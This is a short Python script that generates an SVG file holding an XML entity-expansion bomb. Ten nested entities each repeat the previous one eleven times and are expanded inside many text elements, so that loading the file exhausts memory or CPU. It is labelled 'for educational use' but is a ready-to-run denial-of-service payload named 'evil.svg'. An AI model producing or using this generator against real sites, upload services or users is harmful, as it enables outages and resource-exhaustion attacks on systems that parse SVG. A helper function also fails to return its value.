#
# svg hell -- xml bomb generator for svg
#
# for educational use
# please don't allow svg on 8ch.net 
#
# usage: python svghell.py > evil.svg
#

import random
import string

class appendstr:
    """
    character appending string
    """
    
    def __init__(self, v='\n'):
        self.s = ''
        self.v = v

    def __add__(self, v):
        self.s = self.s + v + self.v
        return self
        
    def __str__(self):
        return self.s

randint = lambda : random.randint(1, 1000)

def rand_str(strlen):
    ret = ''
    for n in range(strlen):
        ret += random.choice(string.ascii_letters)

class SVGHell:
    """
    svg xml bomb generator
    """
    
    def __init__(self, num, base_str='bomb', description=None):
        self.num = num 
        self.base_str = base_str
        if description is None:
            description = rand_str(randint())
        self.description = description
        
    def generate(self):
        """
        generate an svg that explodes when loading
        """
        data = appendstr()
        data += '<?xml version="1.0" standalone="no"?>'
        data += '<!DOCTYPE svg ['
        data += '<!ENTITY {}0 "{}">'.format(self.base_str, self.base_str)
        for n in range(1, self.num + 1):
            data += '<!ENTITY {}{} "{}">'.format(self.base_str, n, ('&{}{};'.format(self.base_str, n-1)) * (self.num + 1))
        data += ']>'
        data += '<svg width="{}cm" height="{}cm" viewBox="0 0 {} {}" version="1.1"'.format(randint(), randint(), randint(), randint())
        data += 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        data += '<desc>{}</desc>'.format(self.description)
        for _ in range(self.num):
            data += '<text x="{}" y="{}" d="&{}{};">'.format(randint(), randint(), self.base_str, self.num)
        data += '</text>'
        data += '</svg>'
        return str(data)



if __name__ == '__main__':
     print ( SVGHell(10).generate() )
